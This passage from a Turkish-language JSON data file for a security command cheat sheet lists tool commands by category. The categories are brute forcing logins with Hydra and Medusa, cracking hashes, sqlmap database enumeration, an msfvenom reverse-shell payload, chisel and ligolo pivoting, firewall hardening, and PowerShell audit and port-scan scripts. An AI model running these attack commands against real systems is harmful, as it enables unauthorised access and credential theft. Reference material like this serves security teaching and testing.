        "category": "mitm",
        "categoryName": "5. MITM & Dinleme",
        "badge": "AĞ AKIŞ KAYDI",
        "title": "Yakalanan Trafiği PCAP Formatında Dosyaya Yazma (tcpdump -w)",
        "desc": "İncelemeyi daha sonra Wireshark ile yapabilmek için tüm ağ akışını capture.pcap dosyasına depolar.",
        "cmd": "sudo tcpdump -i any -c 50 -w capture.pcap"
    },
    {
        "id": 78,
        "category": "auth",
        "categoryName": "6. Kimlik & Parola",
        "badge": "WEB LOGIN TESTİ",
        "title": "Modem / Web Paneli Giriş Doğrulama Testi (Hydra)",
        "desc": "Belirlenen kullanıcı adı ve şifre ikilisinin web arayüzünde geçerli olup olmadığını otomatik kontrol eder.",
        "cmd": "hydra -l admin -p Sebu132009 192.168.1.1 http-get /"
    },
    {
        "id": 79,
        "category": "auth",
        "categoryName": "6. Kimlik & Parola",
        "badge": "SSH PAROLA LİSTESİ",
        "title": "SSH Sunucusunda Güçsüz Parola Taraması (Hydra SSH)",
        "desc": "Kullanıcı ve şifre kelime listeleri kullanarak SSH portunda varsayılan veya tahmin edilebilir parolaları denetler.",
        "cmd": "hydra -L users.txt -P passwords.txt ssh://127.0.0.1 -t 4"
    },
    {
        "id": 80,
        "category": "auth",
        "categoryName": "6. Kimlik & Parola",
        "badge": "FTP DENETİMİ",
        "title": "FTP Sunucusunda Kaba Kuvvet Testi (Hydra FTP)",
        "desc": "FTP dosya sunucusunun başarısız giriş sınırlandırması (Fail2ban) olup olmadığını test eder.",
        "cmd": "hydra -l root -P rockyou.txt ftp://192.168.1.10 -vV"
    },
    {
        "id": 81,
        "category": "auth",
        "categoryName": "6. Kimlik & Parola",
        "badge": "RDP DENETİMİ",
        "title": "Windows Uzak Masaüstü Giriş Doğrulaması (Hydra RDP)",
        "desc": "Windows RDP (3389) portuna bağlanarak hesap kilitleme politikasının çalışıp çalışmadığını ölçer.",
        "cmd": "hydra -l admin -P pass.txt rdp://192.168.1.15"
    },
    {
        "id": 82,
        "category": "auth",
        "categoryName": "6. Kimlik & Parola",
        "badge": "HASH PAROLA KIRICI",
        "title": "Rockyou Sözlüğü ile Parola Özeti Çözme (John the Ripper)",
        "desc": "Çalınan veya ele geçirilen şifre özetlerini (hash) 14 milyonluk devasa kelime listesiyle karşılaştırarak çözer.",
        "cmd": "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt"
    },
    {
        "id": 83,
        "category": "auth",
        "categoryName": "6. Kimlik & Parola",
        "badge": "HAM MD5 DENETİMİ",
        "title": "MD5 Formatındaki Özetleri Denetleme (John MD5)",
        "desc": "Eski tip MD5 şifre özetlerinin ne kadar savunmasız olduğunu ve saniyeler içinde kırılabildiğini kanıtlar.",
        "cmd": "john --format=Raw-MD5 hash.txt"
    },
    {
        "id": 84,
        "category": "auth",
        "categoryName": "6. Kimlik & Parola",
        "badge": "GPU HASHCAT",
        "title": "Ekran Kartı Destekli Yüksek Hızlı Parola Kırıcı (Hashcat)",
        "desc": "Ekran kartının paralel işlem gücünü kullanarak saniyede milyarlarca parola dener.",
        "cmd": "hashcat -m 0 -a 0 hash.txt rockyou.txt"
    },
    {
        "id": 85,
        "category": "auth",
        "categoryName": "6. Kimlik & Parola",
        "badge": "NTLM PAROLA",
        "title": "Windows NTLM Parola Özeti Denetimi (Hashcat -m 1000)",
        "desc": "Windows Active Directory ortamından elde edilen NTLM parola özetlerini test eder.",
        "cmd": "hashcat -m 1000 -a 0 ntlm.txt rockyou.txt"
    },
    {
        "id": 86,
        "category": "auth",
        "categoryName": "6. Kimlik & Parola",
        "badge": "HEDEFE ÖZEL SÖZLÜK",
        "title": "Hedef Web Sitesinden Özel Kelime Listesi Üretme (CeWL)",
        "desc": "Şirketin web sitesindeki tüm teknik terimleri, kurucu isimlerini ve sloganları çekerek hedefe özel parola sözlüğü oluşturur.",
        "cmd": "cewl https://example.com -d 2 -m 5 -w custom_list.txt"
    },
    {
        "id": 87,
        "category": "auth",
        "categoryName": "6. Kimlik & Parola",
        "badge": "PIN KOMBİNASYONLARI",
        "title": "Tüm Olası 8 Haneli Rakam Listesini Üretme (Crunch)",
        "desc": "Belirli kurallara (örn: 8 basamaklı rakamlar) uygun şifre kombinasyonlarını otomatik dosya haline getirir.",
        "cmd": "crunch 8 8 0123456789 -o pins.txt"
    },
    {
        "id": 88,
        "category": "auth",
        "categoryName": "6. Kimlik & Parola",
        "badge": "MODÜLER KİMLİK TESTİ",
        "title": "Hızlı Paralel Ağ Giriş Denetimi (Medusa)",
        "desc": "Hydra alternatifi modüler kimlik denetleme aracıyla SSH ve Telnet servislerini test eder.",
        "cmd": "medusa -h 192.168.1.10 -u admin -P passwords.txt -M ssh"
    },
    {
        "id": 89,
        "category": "auth",
        "categoryName": "6. Kimlik & Parola",
        "badge": "ŞİFRELİ ZIP DOSYASI",
        "title": "ZIP Arşivinin Parolasını Denetleme (fcrackzip)",
        "desc": "Parola ile kilitlenmiş ZIP dosyalarının güvenliğini sözlük saldırısıyla test eder.",
        "cmd": "fcrackzip -u -D -p rockyou.txt secret.zip"
    },
    {
        "id": 90,
        "category": "auth",
        "categoryName": "6. Kimlik & Parola",
        "badge": "ŞİFRELİ PDF DOSYASI",
        "title": "PDF Parolası Güvenlik Testi (pdfcrack)",
        "desc": "Gizli kurumsal PDF belgelerinin zayıf parolalarını ortaya çıkarır.",
        "cmd": "pdfcrack -f confidential.pdf -w wordlist.txt"
    },
    {
        "id": 91,
        "category": "auth",
        "categoryName": "6. Kimlik & Parola",
        "badge": "HASH TÜRÜ TESPİTİ",
        "title": "Bilinmeyen Parola Özetinin Türünü Bulma (hashid)",
        "desc": "Elinizdeki şifreli metnin MD5 mi, SHA-256 mı, bcrypt mi yoksa NTLM mi olduğunu saniyede tespit eder.",
        "cmd": "hashid \"$6$5p0y...\""
    },
    {
        "id": 92,
        "category": "auth",
        "categoryName": "6. Kimlik & Parola",
        "badge": "ÇOK PROTOKOLLÜ TEST",
        "title": "Python Tabanlı Kaba Kuvvet Aracı (Patator)",
        "desc": "Web formları, SSH, FTP ve SQL servisleri dahil her türlü giriş protokolünü aynı anda test eder.",
        "cmd": "patator ssh_login host=127.0.0.1 user=admin password=FILE0 0=pass.txt"
    },
    {
        "id": 93,
        "category": "exploit",
        "categoryName": "7. Zafiyet & Exploit",
        "badge": "OTOMATİK SQLI",
        "title": "Otomatik SQL Enjeksiyonu Tespiti & Veritabanı Listeleme (sqlmap)",
        "desc": "Web uygulamasındaki SQL enjeksiyon açıklarını otomatik sömürür ve sunucudaki tüm veritabanı adlarını listeler.",
        "cmd": "sqlmap -u \"http://127.0.0.1/api/search?q=test\" --dbs --batch"
    },
    {
        "id": 94,
        "category": "exploit",
        "categoryName": "7. Zafiyet & Exploit",
        "badge": "TABLO ÇEKME",
        "title": "Veritabanındaki Tabloları Listeleme (sqlmap --tables)",
        "desc": "Hedef veritabanındaki kullanıcılar (users), şifreler veya kredi kartı tablolarını deşifre eder.",
        "cmd": "sqlmap -u \"http://127.0.0.1/api/search?q=test\" -D master --tables"
    },
    {
        "id": 95,
        "category": "exploit",
        "categoryName": "7. Zafiyet & Exploit",
        "badge": "POST İSTEK ANALİZİ",
        "title": "Ham HTTP İsteği Dosyasını Sqlmap ile Tarama (sqlmap -r)",
        "desc": "Burp Suite ile kaydedilen ham HTTP POST isteğini baştan sona SQL açığı için test eder.",
        "cmd": "sqlmap -r request.txt --batch --risk=3 --level=5"
    },
    {
        "id": 96,
        "category": "exploit",
        "categoryName": "7. Zafiyet & Exploit",
        "badge": "ÇEVRİMDIŞI EXPLOIT",
        "title": "Exploit-DB Arşivinde Zafiyet Kodu Arama (Searchsploit)",
        "desc": "İnternet bağlantısı olmadan yerel veritabanında Apache 2.4.49 için yayınlanmış exploit kodlarını arar.",
        "cmd": "searchsploit apache 2.4.49"
    },
    {
        "id": 97,
        "category": "exploit",
        "categoryName": "7. Zafiyet & Exploit",
        "badge": "EXPLOIT İNDİRME",
        "title": "İlgili Exploit Kodunu Çalışma Dizinine Kopyalama (searchsploit -m)",
        "desc": "Bulunan Python veya C dilindeki exploit kodunu masaüstüne kopyalar ve incelemenizi sağlar.",
        "cmd": "searchsploit -m 50383"
    },
    {
        "id": 98,
        "category": "exploit",
        "categoryName": "7. Zafiyet & Exploit",
        "badge": "ŞABLON TARAYICI",
        "title": "Güncel CVE Açıklarını Şablonlarla Tarama (Nuclei)",
        "desc": "Topluluk tarafından hazırlanan YAML şablonlarıyla hedefteki kritik zafiyetleri dakikalar içinde tespit eder.",
        "cmd": "nuclei -u http://127.0.0.1 -t cves/"
    },
    {
        "id": 99,
        "category": "exploit",
        "categoryName": "7. Zafiyet & Exploit",
        "badge": "GÜVENSİZ BAŞLIKLAR",
        "title": "Eksik Güvenlik Başlıklarını Şablonla Bulma (Nuclei Headers)",
        "desc": "Hedef web sitesinde HSTS, CSP veya X-Frame-Options eksikliklerini otomatik listeler.",
        "cmd": "nuclei -u http://127.0.0.1 -tags headers"
    },
    {
        "id": 100,
        "category": "exploit",
        "categoryName": "7. Zafiyet & Exploit",
        "badge": "METASPLOIT KONSOLU",
        "title": "Metasploit Framework'ü Başlatma (msfconsole)",
        "desc": "Dünyanın en popüler sızma testi çerçevesini sessiz modda açar.",
        "cmd": "msfconsole -q"
    },
    {
        "id": 101,
        "category": "exploit",
        "categoryName": "7. Zafiyet & Exploit",
        "badge": "TERS BAĞLANTI (REVERSE SHELL)",
        "title": "Linux x64 Test Yükü (Payload) Üretme (msfvenom)",
        "desc": "Eğitim amaçlı ters kabuk (reverse shell) ELF ikili dosyası oluşturur.",
        "cmd": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf -o rev.elf"
    },
    {
        "id": 102,
        "category": "exploit",
        "categoryName": "7. Zafiyet & Exploit",
        "badge": "KOMUT ENJEKSİYONU",
        "title": "Otomatik İşletim Sistemi Komut Enjeksiyonu Tespiti (Commix)",
        "desc": "Web sayfasındaki formların arkadaki işletim sistemi komut satırına (bash/cmd) sızıp sızmadığını test eder.",
        "cmd": "commix --url=\"http://127.0.0.1/ping.php?ip=127.0.0.1\""
    },
    {
        "id": 103,
        "category": "exploit",
        "categoryName": "7. Zafiyet & Exploit",
        "badge": "XSS ANALİZİ",
        "title": "Modern Siteler Arası Betik Çalıştırma Tarayıcısı (Dalfox)",
        "desc": "Web sitesinde DOM, Reflected ve Stored XSS açıklarını gelişmiş analiz motoruyla arar.",
        "cmd": "dalfox url http://127.0.0.1/search.php?q=test"
    },
    {
        "id": 104,
        "category": "exploit",
        "categoryName": "7. Zafiyet & Exploit",
        "badge": "WORDPRESS EXPLOIT",
        "title": "WordPress Güvenlik Açıklarını Ayrıntılı Tarama (wpscan)",
        "desc": "Kurulu eklentilerdeki bilinen tüm exploitleri ve SQLi açıklarını raporlar.",
        "cmd": "wpscan --url http://127.0.0.1 --plugins-detection aggressive"
    },
    {
        "id": 105,
        "category": "exploit",
        "categoryName": "7. Zafiyet & Exploit",
        "badge": "CVE VERİTABANI",
        "title": "CVE Kodunun Detaylarını ve Risk Puanını Öğrenme (cve-search)",
        "desc": "Örneğin Log4j açığı olan CVE-2021-44228'in CVSS puanını ve etkilenen sistemleri listeler.",
        "cmd": "cve-search -c CVE-2021-44228"
    },
    {
        "id": 106,
        "category": "exploit",
        "categoryName": "7. Zafiyet & Exploit",
        "badge": "MODEM AÇIKLARI",
        "title": "Gömülü Cihazlar ve Modem Zafiyet Çerçevesi (Routersploit)",
        "desc": "Ağ yönlendiricileri ve IP kameralardaki varsayılan şifre ve donanım açıklarını denetler.",
        "cmd": "routersploit"
    },
    {
        "id": 107,
        "category": "exploit",
        "categoryName": "7. Zafiyet & Exploit",
        "badge": "TERSİNE MÜHENDİSLİK",
        "title": "NSA Kaynaklı Tersine Mühendislik Çerçevesi (Ghidra)",
        "desc": "Zararlı yazılımların kaynak kodunu deşifre etmek ve güvenlik açıklarını analiz etmek için kullanılan decompiler yazılımıdır.",
        "cmd": "ghidra"
    },
    {
        "id": 108,
        "category": "tunnel",
        "categoryName": "8. Tünel & Pivot",
        "badge": "PORT DİNLEYİCİ",
        "title": "Netcat ile Dinleme Portu Açma (nc -lvnp)",
        "desc": "4444 numaralı portta TCP dinleyici açarak gelen bağlantıları ve ham verileri terminalde görüntüler.",
        "cmd": "nc -lvnp 4444"
    },
    {
        "id": 109,
        "category": "tunnel",
        "categoryName": "8. Tünel & Pivot",
        "badge": "PORT BAĞLANTISI",
        "title": "Netcat ile Uzak Porta Bağlanma (nc -nv)",
        "desc": "Uzak sunucunun belirli bir portuna bağlanarak servisin açık olup olmadığını ve gönderdiği banner metnini test eder.",
        "cmd": "nc -nv 127.0.0.1 4444"
    },
    {
        "id": 110,
        "category": "tunnel",
        "categoryName": "8. Tünel & Pivot",
        "badge": "HIZLI PORT TARAMA",
        "title": "Netcat ile Sessiz Port Taraması (nc -z)",
        "desc": "Veri göndermeden sadece port aralığını yoklayarak açık olanları listeler.",
        "cmd": "nc -z -v -w 1 127.0.0.1 80-90"
    },
    {
        "id": 111,
        "category": "tunnel",
        "categoryName": "8. Tünel & Pivot",
        "badge": "SOKET KÖPRÜSÜ",
        "title": "Çift Yönlü Trafik Yönlendirme Köprüsü (Socat)",
        "desc": "8080 portuna gelen tüm istekleri şeffaf şekilde iç ağdaki 80 portuna aktarır.",
        "cmd": "socat TCP-LISTEN:8080,fork TCP:127.0.0.1:80"
    },
    {
        "id": 112,
        "category": "tunnel",
        "categoryName": "8. Tünel & Pivot",
        "badge": "HTTP TERS TÜNEL",
        "title": "Güvenlik Duvarı Arkasındaki Sunucuya Chisel Tüneli",
        "desc": "Normalde dışarı kapalı portları HTTP/WebSocket üzerinden şifreli tünel ile dışarı aktarır.",
        "cmd": "chisel server -p 8000 --reverse"
    },
    {
        "id": 113,
        "category": "tunnel",
        "categoryName": "8. Tünel & Pivot",
        "badge": "CHİSEL İSTEMCİSİ",
        "title": "İç Servisi Dış Portta Yayınlama (Chisel Client)",
        "desc": "İç ağdaki web servisini uzaktaki sunucunun portuna bağlar.",
        "cmd": "chisel client 127.0.0.1:8000 R:8080:127.0.0.1:80"
    },
    {
        "id": 114,
        "category": "tunnel",
        "categoryName": "8. Tünel & Pivot",
        "badge": "SSH YEREL TÜNEL",
        "title": "SSH ile Yerel Port Tünelleme (ssh -L)",
        "desc": "Kendi bilgisayarınızın 8080 portunu güvenli SSH tüneli üzerinden uzak sunucunun web servisine bağlar.",
        "cmd": "ssh -L 8080:127.0.0.1:80 user@remote-server"
    },
    {
        "id": 115,
        "category": "tunnel",
        "categoryName": "8. Tünel & Pivot",
        "badge": "SSH UZAK TÜNEL",
        "title": "SSH ile Uzak Port Tünelleme (ssh -R)",
        "desc": "Kendi yerel geliştirme sunucunuzu (localhost:3000) dış dünyaya güvenle açar.",
        "cmd": "ssh -R 9000:localhost:3000 user@remote-server"
    },
    {
        "id": 116,
        "category": "tunnel",
        "categoryName": "8. Tünel & Pivot",
        "badge": "SOCKS5 PROXY",
        "title": "SSH ile Dinamik SOCKS5 Proxy Kurma (ssh -D)",
        "desc": "Tüm tarayıcı ve ağ trafiğinizi şifreli bir SSH sunucusu üzerinden geçiren yerel proxy oluşturur.",
        "cmd": "ssh -D 1080 -q -C -N user@remote-server"
    },
    {
        "id": 117,
        "category": "tunnel",
        "categoryName": "8. Tünel & Pivot",
        "badge": "PROXY ZİNCİRİ",
        "title": "Tüm Komutları Tor veya Proxy Üzerinden Yürütme (Proxychains)",
        "desc": "Nmap taramasını veya web araçlarını proxy zincirinin arkasından geçirerek IP adresinizi gizler.",
        "cmd": "proxychains nmap -sT -Pn 10.0.0.5"
    },
    {
        "id": 118,
        "category": "tunnel",
        "categoryName": "8. Tünel & Pivot",
        "badge": "TÜNEL PİVOTING",
        "title": "Modern Ağ Arayüzü Tüneli (Ligolo-ng)",
        "desc": "Sızılan hedef sunucuyu bir yönlendiriciye dönüştürerek arka taraftaki kapalı iç ağlara doğrudan erişim sağlar.",
        "cmd": "ligolo-ng"
    },
    {
        "id": 119,
        "category": "tunnel",
        "categoryName": "8. Tünel & Pivot",
        "badge": "SSH KİMLİK DOĞRULAMA",
        "title": "Parolasız Güvenli SSH Girişi (ssh-copy-id)",
        "desc": "Ortak kriptografik anahtarınızı uzak sunucuya yükleyerek şifre çalınma riskini ortadan kaldırır.",
        "cmd": "ssh-copy-id -i ~/.ssh/id_rsa.pub user@remote-server"
    },
    {
        "id": 120,
        "category": "blue",
        "categoryName": "9. Blue Team & SOC",
        "badge": "FIREWALL DURUMU",
        "title": "Linux Güvenlik Duvarı Durumunu ve Kurallarını İnceleme (ufw)",
        "desc": "Hangi portların açık, hangi IP'lerin engelli olduğunu ayrıntılı olarak raporlar.",
        "cmd": "sudo ufw status verbose"
    },
    {
        "id": 121,
        "category": "blue",
        "categoryName": "9. Blue Team & SOC",
        "badge": "HTTPS İZNİ",
        "title": "Yalnızca Şifreli Web Trafiğine İzin Verme (ufw allow 443)",
        "desc": "Dış dünyadan sadece güvenli HTTPS (443) isteklerine onay verir.",
        "cmd": "sudo ufw allow 443/tcp"
    },
    {
        "id": 122,
        "category": "blue",
        "categoryName": "9. Blue Team & SOC",
        "badge": "SSH KAPATMA",
        "title": "Dışarıdan SSH Girişlerini Engelleme (ufw deny 22)",
        "desc": "Uzaktan kaba kuvvet parola saldırılarını önlemek için SSH portunu dış dünyaya kilitler.",
        "cmd": "sudo ufw deny 22/tcp"
    },
    {
        "id": 123,
        "category": "blue",
        "categoryName": "9. Blue Team & SOC",
        "badge": "ÇEKİRDEK TABLOSU",
        "title": "Ham Çekirdek Paket Filtreleme Tablosunu İnceleme (iptables)",
        "desc": "Linux çekirdeğindeki filtreleme zincirlerini (INPUT, OUTPUT, FORWARD) ve sayaçları gösterir.",
        "cmd": "sudo iptables -L -n -v"
    },
    {
        "id": 124,
        "category": "blue",
        "categoryName": "9. Blue Team & SOC",
        "badge": "SALDIRGAN IP ENGELLEME",
        "title": "Saldırgan Bir IP Adresini Çekirdek Düzeyinde Engelleme (iptables DROP)",
        "desc": "Şüpheli IP adresinden gelen tüm paketleri sunucuya ulaşmadan sessizce çöpe atar.",
        "cmd": "sudo iptables -A INPUT -s 192.168.1.100 -j DROP"
    },
    {
        "id": 125,
        "category": "blue",
        "categoryName": "9. Blue Team & SOC",
        "badge": "AÇIK PORTLAR & PID",
        "title": "Sistemde Dinlenen Tüm Portları ve İşlemleri Görme (ss -tulpn)",
        "desc": "Sunucudaki hangi portun hangi yazılım (PID numarası) tarafından dinlendiğini anında döker.",
        "cmd": "ss -tulpn"
    },
    {
        "id": 126,
        "category": "blue",
        "categoryName": "9. Blue Team & SOC",
        "badge": "BAĞLANTI DURUMU",
        "title": "Aktif Ağ Bağlantılarını Sorgulama (netstat)",
        "desc": "Sisteme kimlerin bağlı olduğunu (ESTABLISHED) ve dışarıya açılan soketleri gösterir.",
        "cmd": "netstat -antup"
    },
    {
        "id": 127,
        "category": "blue",
        "categoryName": "9. Blue Team & SOC",
        "badge": "PORTU KULLANAN UYGULAMA",
        "title": "Belirli Portu Tutan İşlemi Bulma (lsof)",
        "desc": "Örneğin 80 numaralı portun arkasındaki dotnet veya nginx işlemini PID ile listeler.",
        "cmd": "sudo lsof -i :80"
    },
    {
        "id": 128,
        "category": "blue",
        "categoryName": "9. Blue Team & SOC",
        "badge": "CANLI SERVİS GÜNLÜĞÜ",
        "title": "Güvenlik Servisi Loglarını Canlı Takip Etme (journalctl -f)",
        "desc": "Uygulamanın erişim ve hata loglarını canlı olarak terminale akıtır.",
        "cmd": "journalctl -u lfl-defense -f"
    },
    {
        "id": 129,
        "category": "blue",
        "categoryName": "9. Blue Team & SOC",
        "badge": "BAŞARISIZ GİRİŞ RAPORU",
        "title": "Linux Güvenlik Denetimi Başarısız Giriş Raporu (aureport)",
        "desc": "Linux Auditd servisinin kaydettiği tüm hatalı parola denemelerini listeler.",
        "cmd": "sudo aureport --auth"
    },
    {
        "id": 130,
        "category": "blue",
        "categoryName": "9. Blue Team & SOC",
        "badge": "OTOMATİK BAN SİSTEMİ",
        "title": "Fail2ban Engellenen Saldırgan Listesi (fail2ban-client)",
        "desc": "Üst üste yanlış şifre giren saldırganların IP adreslerini geçici olarak engelleyen servisin durumudur.",
        "cmd": "sudo fail2ban-client status"
    },
    {
        "id": 131,
        "category": "blue",
        "categoryName": "9. Blue Team & SOC",
        "badge": "ROOTKIT TARAYICI",
        "title": "Sisteme Gizlenmiş Rootkit ve Arka Kapı Taraması (chkrootkit)",
        "desc": "Sistem dosyalarının değiştirilip değiştirilmediğini ve gizli trojanları denetler.",
        "cmd": "sudo chkrootkit -q"
    },
    {
        "id": 132,
        "category": "blue",
        "categoryName": "9. Blue Team & SOC",
        "badge": "GÜVENLİK AÇIĞI AVCI",
        "title": "Bütünlük ve Zafiyet Denetleyicisi (rkhunter)",
        "desc": "Kritik sistem ikili dosyalarının MD5 özetlerini orijinal arşivle karşılaştırarak kurcalamaları yakalar.",
        "cmd": "sudo rkhunter -c --sk"
    },
    {
        "id": 133,
        "category": "blue",
        "categoryName": "9. Blue Team & SOC",
        "badge": "ÇEKİRDEK GÜVENLİK AYARI",
        "title": "IP Yönlendirmeyi Kapatarak Ortadaki Adam Saldırısını Engelleme",
        "desc": "Bilgisayarın yabancı paketleri yönlendirmesini engelleyerek gateway sahteciliğini önler.",
        "cmd": "sysctl -w net.ipv4.ip_forward=0"
    },
    {
        "id": 134,
        "category": "blue",
        "categoryName": "9. Blue Team & SOC",
        "badge": "SYN COOKIES SAVUNMASI",
        "title": "SYN Flood Saldırılarına Karşı SYN Cookies Korumasını Açma",
        "desc": "Çekirdek düzeyinde SYN Cookies mekanizmasını devreye sokarak bellek dolmasını engeller.",
        "cmd": "sysctl -w net.ipv4.tcp_syncookies=1"
    },
    {
        "id": 135,
        "category": "powershell",
        "categoryName": "10. PowerShell Denetim",
        "badge": "GÜVENLİK BAŞLIK DENETİMİ",
        "title": "Kurumsal HTTP Güvenlik Başlıkları Denetim Scripti (Audit-Headers.ps1)",
        "desc": "Strict-Transport-Security, Content-Security-Policy, X-Frame-Options ve nosniff başlıklarını doğrular; eksik varsa risk raporu üretir.",
        "cmd": "$TargetUrl = \"https://burakbezmen.github.io/cyberburak_wyxz\"\n\n$RequiredHeaders = @(\n    \"Strict-Transport-Security\",\n    \"Content-Security-Policy\",\n    \"X-Frame-Options\",\n    \"X-Content-Type-Options\",\n    \"Referrer-Policy\"\n) \n\ntry {\n    # HTTP HEAD isteği göndererek başlıkları alıyoruz\n    $Response = Invoke-WebRequest -Uri $TargetUrl -Method Head -ErrorAction Stop\n    $ResponseHeaders = $Response.Headers\n\n    Write-Host \"`n=== GÜVENLİK BAŞLIĞI DENETİM RAPORU ===\" -ForegroundColor Cyan\n    Write-Host \"Hedef: $TargetUrl`n\"\n\n    foreach ($Header in $RequiredHeaders) {\n        if ($ResponseHeaders.ContainsKey($Header)) {\n            Write-Host \"[✔] GÜVENLİ: '$Header' başlığı tanımlanmış.\" -ForegroundColor Green\n            Write-Host \"    Değer: $($ResponseHeaders[$Header])\" -ForegroundColor Gray\n        } else {\n            Write-Host \"[✘] RİSK: '$Header' BAŞLIĞI EKSİK!\" -ForegroundColor Red\n        }\n    }\n}\ncatch {\n    Write-Host \"Hata oluştu: $_\" -ForegroundColor DarkRed\n}"
    },
    {
        "id": 136,
        "category": "powershell",
        "categoryName": "10. PowerShell Denetim",
        "badge": "ÇOK KANALLI PORT TARA",
        "title": "Yüksek Hızlı RunspacePool Asenkron Port Tarayıcı (Port-Scan.ps1)",
        "desc": "Tüm işlemci çekirdeklerini kullanarak 16 eşzamanlı kanaldan açık portları 0.3 saniyede tespit eder.",
        "cmd": "$Target = \"https://burakbezmen.github.io/cyberburak_wyxz\"\n$Ports = @(21,22,23,25,53,80,110,135,139,443,445,1433,3306,3389,8080,8443)\n$TimeoutMs = 1000\n\nWrite-Host \"`n=== MULTI-THREAD (OP) PORT TARAMA RAPORU ===\" -ForegroundColor Magenta\nWrite-Host \"Hedef Sistem: $Target\"\nWrite-Host \"Aynı anda taranan port sayısı: $($Ports.Count)`n\"\n\n$RunspacePool = [runspacefactory]::CreateRunspacePool(1, [int]$env:NUMBER_OF_PROCESSORS)\n$RunspacePool.Open()\n$Jobs = @()\n\n$ScriptBlock = {\n    param($Target, $Port, $TimeoutMs)\n    $TcpClient = New-Object System.Net.Sockets.TcpClient\n    $AsyncResult = $TcpClient.BeginConnect($Target, $Port, $null, $null)\n    $Wait = $AsyncResult.AsyncWaitHandle.WaitOne($TimeoutMs, $false)\n    \n    if ($Wait) {\n        try {\n            $TcpClient.EndConnect($AsyncResult)\n            return [PSCustomObject]@{ Port = $Port; Status = \"AÇIK\" }\n        } catch {\n            return [PSCustomObject]@{ Port = $Port; Status = \"Kapalı\" }\n        } finally {\n            $TcpClient.Close()\n        }\n    } else {\n        $TcpClient.Close()\n        return [PSCustomObject]@{ Port = $Port; Status = \"Kapalı (Zaman Aşımı)\" }\n    }\n}\n\nforeach ($Port in $Ports) {\n    $PowerShell = [powershell]::Create().AddScript($ScriptBlock).AddArgument($Target).AddArgument($Port).AddArgument($TimeoutMs)\n    $PowerShell.RunspacePool = $RunspacePool\n    $Jobs += @{ Pipe = $PowerShell; Result = $PowerShell.BeginInvoke() }\n}\n\nforeach ($Job in $Jobs) {\n    $Output = $Job.Pipe.EndInvoke($Job.Result)\n    if ($Output.Status -eq \"AÇIK\") {\n        Write-Host \"[✔] AÇIK : Port $($Output.Port) üzerinden bağlantı sağlandı!\" -ForegroundColor Green\n    } else {\n        Write-Host \"[✘] Kapalı : Port $($Output.Port)\" -ForegroundColor Gray\n    }\n    $Job.Pipe.Dispose()\n}\n\n$RunspacePool.Close()"
    },
    {
        "id": 137,
        "category": "powershell",
        "categoryName": "10. PowerShell Denetim",
        "badge": "BİLGİ İFŞASI KONTROLÜ",
        "title": "Sunucu Banner Bilgi İfşası Denetimi (Banner-Grab.ps1)",
        "desc": "Server ve X-Powered-By başlıklarının saldırganlara sürüm sızdırıp sızdırmadığını kontrol eder.",
        "cmd": "$Target = \"https://burakbezmen.github.io/cyberburak_wyxz\"\n$AltPorts = @(8080, 8443)\n\nWrite-Host \"`n=== ALTERNATİF PORT SERVİS DEŞİFRE (BANNER GRABBING) ===\" -ForegroundColor Yellow\n\nforeach ($Port in $AltPorts) {\n    $Url = if ($Port -eq 8443) { \"https://$Target`:$Port\" } else { \"http://$Target`:$Port\" }\n    Write-Host \"`n[+] Port $Port inceleniyor: $Url\" -ForegroundColor Cyan\n    \n    try {\n        # Sertifika hatalarını göz ardı ederek servise ham istek atıyoruz\n        [Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}\n        $Request = [System.Net.WebRequest]::Create($Url)\n        $Request.Method = \"GET\"\n        $Request.Timeout = 3000\n        $Request.UserAgent = \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"\n        \n        $Response = $Request.GetResponse()\n        Write-Host \"[✔] Yanıt Alındı! Sunucu Başlığı:\" -ForegroundColor Green\n        Write-Host \"    Server: $($Response.Headers[\"Server\"])\" -ForegroundColor White\n        Write-Host \"    Powered By: $($Response.Headers[\"X-Powered-By\"])\" -ForegroundColor White\n        $Response.Close()\n    } catch {\n        if ($_.Exception.InnerException -and $_.Exception.InnerException.Message -match \"40[0-9]|50[0-9]\") {\n            Write-Host \"[!] Sunucu hata kodu döndürdü (Zafiyet olabilir). Başlıklar:\" -ForegroundColor Orange\n            Write-Host \"    Server: $($_.Exception.InnerException.Response.Headers[\"Server\"])\" -ForegroundColor White\n        } else {\n            Write-Host \"[✘] Doğrudan başlık çekilemedi: $($_.Exception.Message)\" -ForegroundColor Gray\n        }\n    }\n}"
    },
    {
        "id": 138,
        "category": "powershell",
        "categoryName": "10. PowerShell Denetim",
        "badge": "SSL/TLS SERTİFİKA DENETİMİ",
        "title": "Sertifika Geçerlilik ve Kripto Protokol Analizi (Check-Certificate.ps1)",
        "desc": "Web sunucusunun TLS 1.3 kullandığını ve sertifika süresinin dolmasına kaç gün kaldığını hesaplar.",
        "cmd": "powershell .\\Check-Certificate.ps1"
    },
    {
        "id": 139,
        "category": "powershell",
        "categoryName": "10. PowerShell Denetim",
        "badge": "WINDOWS TCP DİNLENENLER",
        "title": "Windows Dinlenen TCP Portlarını Listeleme (Get-NetTCPConnection)",
        "desc": "Windows sunucuda açık olan servisleri ve bağlanan istemcilerin IP adreslerini listeler.",
        "cmd": "powershell \"Get-NetTCPConnection -State Listen\""
    },
    {
        "id": 140,
        "category": "powershell",
        "categoryName": "10. PowerShell Denetim",
        "badge": "PORT ERİŞİM TESTİ",
        "title": "Uzak Web Servisinin Ayakta Olup Olmadığını Test Etme (Test-NetConnection)",
        "desc": "443 HTTPS portuna TCP düzeyinde el sıkışma testi göndererek ağ gecikmesini ölçer.",
        "cmd": "powershell \"Test-NetConnection -ComputerName 127.0.0.1 -Port 443\""
    },
    {
        "id": 141,
        "category": "powershell",
        "categoryName": "10. PowerShell Denetim",
        "badge": "DOSYA BÜTÜNLÜĞÜ",
        "title": "Kritik Dosyanın SHA256 Kriptografik Özeti (Get-FileHash)",
        "desc": "Dosyaya herhangi bir arka kapı veya virüs eklenip eklenmediğini doğrulamak için hash özetini çıkarır.",
        "cmd": "powershell \"Get-FileHash -Algorithm SHA256 .\\CyberBlog.dll\""
    },
    {
        "id": 142,
        "category": "powershell",
        "categoryName": "10. PowerShell Denetim",
        "badge": "GÜVENLİK GÜNLÜĞÜ",
        "title": "Windows Olay Günlüğü Son 10 Güvenlik Olayı (Get-EventLog)",
        "desc": "Windows Güvenlik (Security) günlüğündeki son oturum açma ve kimlik denetim kayıtlarını listeler.",
